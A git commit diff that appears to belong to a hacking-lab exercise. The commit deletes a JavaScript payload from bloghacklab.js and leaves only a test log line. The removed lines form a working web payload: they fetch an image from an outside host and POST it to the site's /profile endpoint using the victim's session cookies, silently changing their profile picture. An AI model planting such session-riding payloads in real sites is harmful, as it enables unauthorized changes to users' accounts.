580dbb9af66751f241af63f6e532924c7b499bdc
anon <55331280+KhalilKAN@users.noreply.github.com>
2024-10-19 20:51:37 -0300

    Update bloghacklab.js

--- bloghacklab.js
+++ bloghacklab.js
@@ -1,28 +1,2 @@
-var imgURL = 'https://www.webempresa.com/foro/wp-content/uploads/wpforo/attachments/3200/318277=80538-Sin_imagen_disponible.jpg';
-
-function cambiarImagenPerfil() {
-    
-    fetch(imgURL)
-        .then(function(response) {
-            return response.blob();
-        })
-        .then(function(blob) {
-            var formData = new FormData();
-            formData.append('profile_pic', blob, 'new_profile.jpg');
-
-            return fetch('/profile', {
-                method: 'POST',
-                body: formData,
-                credentials: 'include'  
-            });
-        })
-        .then(function() {
-            console.log('Imagen de perfil cambiada con éxito.');
-        })
-        .catch(function(error) {
-            console.error('Error al cambiar la imagen de perfil:', error);
-        });
-}
-
-cambiarImagenPerfil();
+console.log("test");
 
